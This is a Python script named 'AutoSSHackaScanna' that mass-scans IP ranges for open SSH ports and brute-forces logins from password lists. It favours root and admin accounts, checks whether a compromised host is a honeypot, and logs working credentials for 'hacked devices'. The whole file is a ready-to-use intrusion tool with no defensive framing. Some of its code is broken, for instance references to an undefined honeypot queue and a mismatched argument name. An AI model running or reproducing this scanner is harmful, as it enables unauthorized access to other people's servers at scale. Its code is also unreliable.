#!/bin/env python3
import multiprocessing
import threading
import ipaddress
import paramiko
import argparse
import socket
import random
import queue
import time
import os

'''
  ___        _        _____ _____ _   _            _         _____                             
 / _ \      | |      /  ___/  ___| | | |          | |       /  ___|                            
/ /_\ \_   _| |_ ___ \ `--.\ `--.| |_| | __ _  ___| | ____ _\ `--.  ___ __ _ _ __  _ __   __ _ 
|  _  | | | | __/ _ \ `--. \`--. \  _  |/ _` |/ __| |/ / _` |`--. \/ __/ _` | '_ \| '_ \ / _` |
| | | | |_| | || (_) /\__/ /\__/ / | | | (_| | (__|   < (_| /\__/ / (_| (_| | | | | | | | (_| |
\_| |_/\__,_|\__\___/\____/\____/\_| |_/\__,_|\___|_|\_\__,_\____/ \___\__,_|_| |_|_| |_|\__,_|
Alright, what are the three most common used passwords...

'''

global args
global lock
global colours

def join_lists(files):
    res = []
    for file in files:
        with open(file, 'r') as f:
            res += f.read().splitlines()
    return res

def detect_open_port(addr, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((addr, port))
        print('['+colours['green']+'SCANNER'+colours['clear']+'] %s %d open' % (addr, port))
        sock.close()
        return True
    except:
        sock.close()
        print('['+colours['red']+'SCANNER'+colours['clear']+'] %s %d closed' % (addr, port))
        return False

def ssh_connect(ssh_cli, addr, user, password):
    try:
        ssh_cli.connect(addr, port=22, username=user, password=password,
                        timeout=2, look_for_keys=False, allow_agent=False)
        print('['+colours['bgreen']+'SUCCESS'+colours['clear']+'] %s:%s %s:%d' % (user, password, addr, 22))
        return True
    except:
        print('['+colours['red']+'FAILURE'+colours['clear']+'] %s:%s %s:%d' % (user, password, addr, 22))
        return False

def detect_honeypot(ssh_cli, keyword, valid_combos):
    try:
        stdin, stdout, stderr = ssh_cli.exec_command('echo %s' % (keyword))
        time.sleep(5)
        return not keyword in stdout or len(valid_combos) > .10 * len(combolists)
    except:
        return True

def bruteforce_target(addr, hacked_devices):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    valid_combos = []
    for combo in combolists:
        if ssh_connect(cli, addr, combo[0], combo[1]):
            valid_combos.append(combo)
        time.sleep(random.randrange(3, 6))
    preferred = [ 'root', 'admin' ]
    combo = sorted(valid_combos, key=lambda combo :
        preferred.index(combo[0]) if combo[0] in preferred
        else len(preferred)+1)
    if not detect_honeypot(cli, args.keyword, valid_combos) and len(valid_combos) > 0:
        hacked_devices.put({'addr': addr, 'port': 22, 'user': combo[0],
                                'pass': combo[1], 'is_honeypot': False})
    elif len(valid_combos) > 0:
        print('['+colours['red']+'SSH HONEYPOT'+colours['clear']+'] %s:%s %s:%d' % (combo[0], combo[1], addr, 22))
        honeypots_devices.put({'addr': addr, 'port': 22, 'user': combo[0],
                                'pass': combo[1], 'is_honeypot': True})
    cli.close()

def bruteforce_targets(target_queue, task_status):
    while not target_queue.empty() or task_status.value == 1:
        if not target_queue.empty():
            queue_size_est = target_queue.qsize()
            thread_num = queue_size_est if queue_size_est < 5 else 5
            hacked_devices = queue.Queue()
            attack_threads = [ threading.Thread(target=bruteforce_target,
                args=(target_queue.get(), hacked_devices,))
                    for i in range(thread_num) ]
            for i in range(thread_num):
                attack_threads[i].start()
            for i in range(thread_num):
                attack_threads[i].join()
            while not hacked_devices.empty():
                hacked_device = hacked_devices.get()
                file_name = args.honeypot if hacked_device['is_honeypot'] else args.output
                with lock and open(file_name, 'a') as f:
                    f.write('%s:%d:%s:%s\n' % (hacked_device['addr'], hacked_device['port'],
                                                hacked_device['user'], hacked_device['pass']))

def scan_targets(ipranges, target_queue, task_status):
    for pos, iprange in enumerate(ipranges):
        hosts = list(iprange.hosts())
        num_hosts = len(hosts)
        print('['+colours['green']+'SCANNING'+colours['clear']+'] %s %d hosts' % (str(iprange), num_hosts))
        for addr in hosts:
            if detect_open_port(format(addr), 22):
                target_queue[pos % args.workers].put(format(addr))
    with task_status.get_lock():
        task_status.value = 0

if __name__ == '__main__':
    # Parse input
    parser = argparse.ArgumentParser(description='Bruteforce particular SSH IP blocks')
    parser.add_argument('-i', '--inputs', type=str,
        help='IP ranges input directory', default='targets/')
    parser.add_argument('-l', '--lists', type=str,
        help='Password lists directory', default='lists/')
    parser.add_argument('-o', '--output', type=str,
        help='Specify output file', default='result.lst')
    parser.add_argument('-k', '--keyword', type=str,
        help='Specify keyword for honeypot detection', default='hacktheplanet')
    parser.add_argument('-w', '--workers', type=int,
        help='Specify number of processes for bruteforcing', default=10)
    parser.add_argument('-H', '--honeypot-list', type=str,
        help='Specify file for detected honeypots to be written',
                                        default='honeypots.lst')

    args = parser.parse_args()

    colours = {
        'red': '\033[31;1m',
        'green': '\033[32;1m',
        'bgreen': '\033[92;1m',
        'clear': '\033[0m'
    }

    # Set important variables
    join_full_path = lambda x : [ os.path.join(x, f) for f in os.listdir(x) ]
    inputs = join_full_path(args.inputs)
    lists = join_full_path(args.lists)
    output = args.output

    ipranges = [ ipaddress.ip_network(iprange) for iprange in join_lists(inputs) ]
    combolists = [ combo.rsplit(':') for combo in join_lists(lists) ]

    random.shuffle(ipranges)
    task_status = multiprocessing.Value('i', 1)
    target_queue = [ multiprocessing.Queue() for i in range(args.workers) ]

    lock = multiprocessing.Lock()
    brute_force_processes = [ multiprocessing.Process(None, bruteforce_targets,
            args=(target_queue[i], task_status)) for i in range(args.workers) ]
    for i in range(args.workers): brute_force_processes[i].start()
    scan_targets(ipranges, target_queue, task_status)
    for i in range(args.workers): brute_force_processes[i].join()
